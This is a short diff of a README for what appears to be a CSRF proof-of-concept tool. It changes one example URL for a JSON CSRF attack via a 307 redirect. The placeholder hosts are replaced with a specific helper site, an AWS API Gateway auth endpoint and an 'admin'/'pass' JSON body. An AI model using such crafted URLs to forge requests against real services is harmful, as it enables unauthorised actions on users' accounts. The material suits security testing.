@@ -64,7 +64,7 @@ If you have the questions regarding this repository - ping me in the Twitter: [@
 ## Example cases (CSRF)
 1) Exploit JSON CSRF, POST-based, 307 redirect:
 ```
-https://example.com/read.html?jsonData={"test":1}&php_url=https://example.com/test.php&endpoint=https://sometargethost.com/endpoint
+https://csrf.kirankarnad.com/read.html?jsonData={"username":"admin","password":"pass"}&php_url=https://csrf.kirankarnad.com/test.php&endpoint=https://xk6lmh1gxi.execute-api.us-east-1.amazonaws.com/kk-20200304/auth
 ```
 2) Exploit XML CSRF, POST-based, 307 redirect:
 ```
